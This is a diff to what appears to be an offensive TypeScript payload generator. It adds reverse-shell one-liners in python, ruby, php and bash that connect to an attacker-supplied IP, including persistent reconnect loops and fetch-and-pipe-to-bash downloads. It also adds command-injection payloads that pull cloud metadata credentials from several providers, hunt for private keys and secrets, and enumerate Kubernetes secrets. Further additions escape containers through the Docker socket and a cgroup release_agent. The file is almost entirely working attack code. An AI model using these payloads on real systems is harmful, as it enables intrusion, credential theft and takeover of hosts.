@@ -134,6 +134,13 @@ export function buildReverseShells(ip: string, port: string): string[] {
     `php -r '$s=fsockopen("${ip}",${port});$p=proc_open("/bin/bash",array(0=>$s,1=>$s,2=>$s),$pp);proc_close($p);'`,
     `curl -sfL "http://${ip}:${port}/" 2>/dev/null|sh || wget -qO- "http://${ip}:${port}/" 2>/dev/null|sh`,
     `go run <(printf 'package main\nimport("net";"os/exec")\nfunc main(){c,_:=net.Dial("tcp","%s:%s");x:=exec.Command("/bin/sh","-i");x.Stdin=c;x.Stdout=c;x.Stderr=c;x.Run()}' "${ip}" "${port}") 2>/dev/null`,
+    `python3 -c "import pty,os,socket;s=socket.socket();s.connect(('${ip}',${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" 2>/dev/null`,
+    `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec "/bin/sh -i"' 2>/dev/null`,
+    `php -r '$s=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");' 2>/dev/null`,
+    `curl -sk "http://${ip}:${port}/sh" 2>/dev/null|bash`,
+    `wget -qO- "http://${ip}:${port}/sh" 2>/dev/null|bash`,
+    `nohup bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1" 2>/dev/null &`,
+    `while :;do bash -i >& /dev/tcp/${ip}/${port} 0>&1;sleep 5;done 2>/dev/null &`,
   ];
 }
 
@@ -154,6 +161,24 @@ export function buildCloudMetaPayloads(cmd: string): string[] {
     `${cmd} && cat ~/.aws/credentials 2>/dev/null`,
     `${cmd} && find / -name "*.env" 2>/dev/null | head -5 | xargs cat 2>/dev/null`,
     `${cmd} && printenv | grep -iE 'token|secret|key|pass|cred|auth|api'`,
+    /* Oracle Cloud */
+    `${cmd} && curl -sk -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v2/instance/`,
+    `${cmd} && curl -sk http://169.254.169.254/opc/v1/instance/`,
+    /* DigitalOcean */
+    `${cmd} && curl -sk http://169.254.169.254/metadata/v1/`,
+    `${cmd} && curl -sk http://169.254.169.254/metadata/v1/user-data`,
+    /* Alibaba Cloud */
+    `${cmd} && curl -sk http://100.100.100.200/latest/meta-data/`,
+    `${cmd} && curl -sk http://100.100.100.200/latest/meta-data/ram/security-credentials/`,
+    /* IBM Cloud */
+    `${cmd} && curl -sk -H "Metadata-Flavor: ibm" http://169.254.169.254/metadata/v1/`,
+    /* Linode */
+    `${cmd} && curl -sk http://169.254.169.254/v1.json`,
+    /* Hetzner */
+    `${cmd} && curl -sk http://169.254.169.254/hetzner/v1/metadata`,
+    /* Extra secrets */
+    `${cmd} && find / -maxdepth 5 \\( -name '*.pem' -o -name 'id_rsa' -o -name '*.key' \\) 2>/dev/null|head -8`,
+    `${cmd} && env | grep -iE 'aws|azure|gcp|cloud|key|secret|token|cred|api|db_|password|mysql|redis|mongo'`,
   ];
 }
 
@@ -169,6 +194,20 @@ export function buildContainerEscapes(cmd: string): string[] {
     `${cmd} && mount | grep overlay`,
     `${cmd} && cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null`,
     `${cmd} && curl -sk https://kubernetes.default.svc/api/ -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"`,
+    /* K8s secret enumeration */
+    `${cmd} && TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets 2>/dev/null | python3 -m json.tool 2>/dev/null|head -50`,
+    `${cmd} && TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null`,
+    /* Docker socket */
+    `${cmd} && docker run --rm -v /:/host alpine chroot /host id 2>/dev/null`,
+    `${cmd} && curl -sk --unix-socket /var/run/docker.sock http://localhost/images/json 2>/dev/null|head -200`,
+    `${cmd} && curl -sk --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["/bin/sh","-c","id && cat /host/etc/passwd"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' 2>/dev/null`,
+    /* Capabilities check */
+    `${cmd} && capsh --print 2>/dev/null|grep -E 'cap_sys_admin|cap_net_admin|cap_sys_ptrace|cap_dac_read_search'`,
+    `${cmd} && getpcaps 1 2>/dev/null`,
+    /* Privileged cgroup escape */
+    `${cmd} && mkdir -p /tmp/nx_cg 2>/dev/null; mount -t cgroup -o memory cgroup /tmp/nx_cg 2>/dev/null && echo 1 > /tmp/nx_cg/notify_on_release 2>/dev/null && echo '#!/bin/sh\nid > /tmp/nx_pwn' > /tmp/nx_release 2>/dev/null && chmod +x /tmp/nx_release 2>/dev/null && echo /tmp/nx_release > /tmp/nx_cg/release_agent 2>/dev/null`,
+    /* Environment probe */
+    `${cmd} && env | grep -iE 'docker|kube|k8s|container|pod|namespace|cluster|secret|token|ca_cert'`,
   ];
 }
 
